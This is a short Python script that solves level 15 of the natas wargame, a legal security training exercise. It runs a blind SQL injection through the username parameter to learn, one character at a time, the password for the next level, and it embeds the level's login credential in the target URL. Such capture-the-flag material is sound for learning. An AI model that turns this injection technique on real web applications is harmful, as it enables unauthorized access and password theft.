# Created by Joao Godinho
#       October 2014
# Script to brute force level 15 of natas wargames
# Refer to http://floatingbytes.blogspot.com for details

# Library to work with the POST requests
import requests

# All possible characters
allChars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
# Parsed characters, the ones that actually exist in the password
parsedChars = ''
# Final Password
password = ''
# Our target URL
target = 'http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/'
# The string that tells we're on the right path
existsStr = 'This user exists.'

# Checking if we can connect to the target, just in case...
r = requests.get(target)
if r.status_code != requests.codes.ok:
        raise ValueError('Kabum? Couldn\'t connect to target :(')
else:
        print 'Target reachable. Starting character parsing...'

# The fun begin, let's see what characters are actually part of the pwd
for c in allChars:
        # SQL injection #1
        r = requests.get(target+'?username=natas16" AND password LIKE BINARY "%'+c+'%" "')
        # So does the password use this char?
        if r.content.find(existsStr) != -1:
                parsedChars += c
                print 'Used chars: ' + parsedChars

print 'Characters parsed. Starting brute force...'

# Assuming password is 32 characters long
for i in range(32):
        for c in parsedChars:
                # SQL injection #2
                r = requests.get(target+'?username=natas16" AND password LIKE BINARY "' + password + c + '%" "')
                # Did we found the character at the i position of the password?
                if r.content.find(existsStr) != -1:
                        password += c
                        print 'Password: ' + password + '*' * int(32 - len(password))
                        break

print 'Done. Have fun!'
